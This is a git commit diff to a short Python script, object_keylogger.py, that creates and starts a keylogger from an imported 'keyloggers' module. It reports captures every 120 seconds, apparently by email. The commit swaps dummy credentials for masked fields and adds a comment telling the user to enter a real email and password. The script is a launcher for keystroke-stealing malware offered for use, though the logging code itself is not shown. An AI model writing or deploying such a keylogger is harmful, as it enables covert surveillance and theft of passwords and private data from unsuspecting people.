d840cfd0019bf169abd2554da3245b98985e9a0e
Developer-Deb <72743817+Developer-Deb@users.noreply.github.com>
2021-11-17 19:06:27 +0530

    Update object_keylogger.py

--- object_keylogger.py
+++ object_keylogger.py
@@ -1,7 +1,7 @@
 #!usr/bin/env python
 import keyloggers
 
-my_keylogger = keyloggers.Keylogger(120, "abcd@gmail.com" , "1234") #using dummy email
+my_keylogger = keyloggers.Keylogger(120, "****" , "****") #use real email and pass in the star field
 #120 sec
 #my_keylogger is a instance of the keylogger class
 my_keylogger.start()
